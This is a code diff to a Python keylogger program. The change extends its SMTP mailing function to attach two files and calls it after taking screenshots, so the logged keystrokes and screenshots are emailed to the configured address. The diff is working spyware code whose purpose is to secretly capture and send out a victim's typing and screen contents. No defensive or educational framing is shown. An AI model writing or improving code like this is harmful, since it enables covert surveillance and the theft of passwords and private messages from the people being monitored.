@@ -109,7 +109,8 @@ def start_keylogger():
             receiver_email=None,
             subject="No subject",
             message="U didn't add any message",
-            attachment_path=None,
+            attachment_path_1=None,
+            attachment_path_2=None
     ):
         import smtplib, ssl
         # Create a MIME object
@@ -118,15 +119,27 @@ def start_keylogger():
         # Attach the message
         msg.attach(MIMEText(message, "plain"))
         
-        if attachment_path:
+        if attachment_path_1:
             # Attach the file
-            with open(attachment_path, "rb") as attachment:
+            with open(attachment_path_1, "rb") as attachment:
                 part = MIMEBase("application", "octet-stream")
                 part.set_payload(attachment.read())
                 encoders.encode_base64(part)
                 part.add_header(
                     "Content-Disposition",
-                    f"attachment; filename= {attachment_path.split('/')[-1]}",
+                    f"attachment; filename= {attachment_path_1.split('/')[-1]}",
+                )
+                msg.attach(part)
+        
+        if attachment_path_2:
+            # Attach the file
+            with open(attachment_path_2, "rb") as attachment:
+                part = MIMEBase("application", "octet-stream")
+                part.set_payload(attachment.read())
+                encoders.encode_base64(part)
+                part.add_header(
+                    "Content-Disposition",
+                    f"attachment; filename= {attachment_path_2.split('/')[-1]}",
                 )
                 msg.attach(part)
 
@@ -145,15 +158,7 @@ def start_keylogger():
             server.sendmail(sender_email, receiver_email, msg.as_string())
 
 
-    # Example usage with attachment
-    send_mail(
-        sender_email=email_address,
-        password=password,
-        receiver_email=email_address,
-        subject="Test Email with Attachment",
-        message="Hello, this is a test email with an attachment!",
-        attachment_path= file_merge + keys_information,  # Replace with the actual path to your attachment
-    )
+    
 
 
     # get screenshots
@@ -207,6 +212,16 @@ def start_keylogger():
 
 
     screenshot()
+    # Example usage with attachment
+    send_mail(
+        sender_email=email_address,
+        password=password,
+        receiver_email=email_address,
+        subject="Test Email with Attachment",
+        message="Hello, this is a test email with an attachment!",
+        attachment_path_1= file_merge + keys_information,  
+        attachment_path_2= file_merge + screenshot_information,
+    )
 
 # Create main window
 root = tk.Tk()
